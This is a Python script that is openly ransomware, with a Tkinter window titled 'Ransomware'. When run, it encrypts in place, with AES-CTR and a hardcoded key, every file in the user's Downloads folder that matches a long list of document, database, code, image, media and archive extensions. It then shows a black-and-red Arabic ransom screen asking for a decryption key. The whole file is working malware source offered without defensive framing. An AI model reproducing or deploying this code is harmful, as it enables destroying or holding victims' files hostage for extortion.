import os
import tkinter as tk
from tkinter import messagebox
from Crypto.Cipher import AES
from Crypto.Util import Counter


def encryption(key, file_name):
    counter = Counter.new(128)
    c = AES.new(key, AES.MODE_CTR, counter=counter)
    if os.path.exists(file_name):
        with open(file_name, 'r+b') as f:
            block_size = 16
            plaintext = f.read(block_size)
            while plaintext:
                f.seek(-len(plaintext), 1)
                f.write(c.encrypt(plaintext))
                plaintext = f.read(block_size)

def decryption(key, file_name):
    counter = Counter.new(128)
    d = AES.new(key, AES.MODE_CTR, counter=counter)
    with open(file_name, 'r+b') as f:
        block_size = 16
        plaintext = f.read(block_size)
        while plaintext:
            f.seek(-len(plaintext), 1)
            f.write(d.decrypt(plaintext))
            plaintext = f.read(block_size)

def dir_f_list(d):
    extensions = [
    # 'exe', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES [danger]
    'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft Office
    'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
    'yml', 'yaml', 'json', 'xml', 'csv', # structured data
    'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images
    'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
    'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
    'java', 'class', 'jar', # java source code
    'ps', 'bat', 'vb', # windows based scripts
    'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
    'go', 'py', 'pyc', 'bf', 'coffee', # other source code files
    'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
    'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
    'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies
    'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak'
    ]
    fd = []
    for root, _, files in os.walk(d):
        for file_name in files:
            full_path = os.path.join(root, file_name)
            
            if os.path.isfile(full_path):
                ex = full_path.split('.')[-1]
                if ex in extensions:
                    fd.append(full_path)
    return fd


user=os.getlogin()
target_directory = f"C://Users/{user}/Downloads"
key_value = str(51688123242)
padding = lambda s: s + (16 - len(s) % 16) * "*"
encryption_key = padding(key_value).encode('ascii')


try:
    files_to_encrypt = dir_f_list(target_directory)
    if not files_to_encrypt:
        print(f"لم يتم العثور على ملفات للتشفير في المسار: {target_directory}")
    else:
        print(f"جاري تشفير {len(files_to_encrypt)} ملف...")
        for f in files_to_encrypt:
            try:
                encryption(encryption_key, f)
            except Exception as e:
                print(f"حدث خطأ أثناء تشفير a {f}: {e}")
        print("اكتمل التشفير.")
except Exception as e:
    print(f"حدث خطأ أثناء عملية التشفير الأولية: {e}")



def attempt_decryption():
    user_key = key_entry.get()
    decryption_key_bytes = padding(user_key).encode('ascii')

    if encryption_key == decryption_key_bytes:
        try:
            files_to_decrypt = dir_f_list(target_directory)
            if not files_to_decrypt:
                 messagebox.showinfo("نجاح", "لم يتم العثور على ملفات لفك تشفيرها.")
                 return

            print(f"المفتاح صحيح. جاري فك تشفير {len(files_to_decrypt)} ملف...")
            for f in files_to_decrypt:
                try:
                    decryption(encryption_key, f)
                except Exception as e:
                    print(f"حدث خطأ أثناء فك تشفير الملف {f}: {e}")
            
            messagebox.showinfo("نجاح", "تم فك تشفير بياناتك بنجاح!")
            root.destroy() 
        except Exception as e:
            messagebox.showerror("خطأ", f"حدث خطأ أثناء فك التشفير: {e}")
    else:
        messagebox.showerror("خطأ في المفتاح", "المفتاح الذي أدخلته خاطئ!")


root = tk.Tk()
root.title(" Ransomware ")
root.geometry("800x600")
root.configure(bg='black') 


frame = tk.Frame(root, bg='black')
frame.pack(pady=100, padx=100, fill="both", expand=True)


title_label = tk.Label(
    frame,
    text="إذا كنت ترغب في استعادة بياناتك\nأدخل مفتاح فك التشفير",
    font=("Arial", 40),
    fg="red",     
    bg="black"     
)
title_label.pack(pady=(0, 20))


key_entry = tk.Entry(
    frame,
    font=("Arial", 20),
    width=100,
    fg="white",
    bg="#333333",
    insertbackground='white' 
)
key_entry.pack(pady=5)


decrypt_button = tk.Button(
    frame,
    text="فك التشفير",
    font=("Arial", 12, "bold"),
    command=attempt_decryption,
    fg="white",
    bg="red",
    activebackground="#B20000", 
    activeforeground="white",
    width=30
)
decrypt_button.pack(pady=20)


root.mainloop()
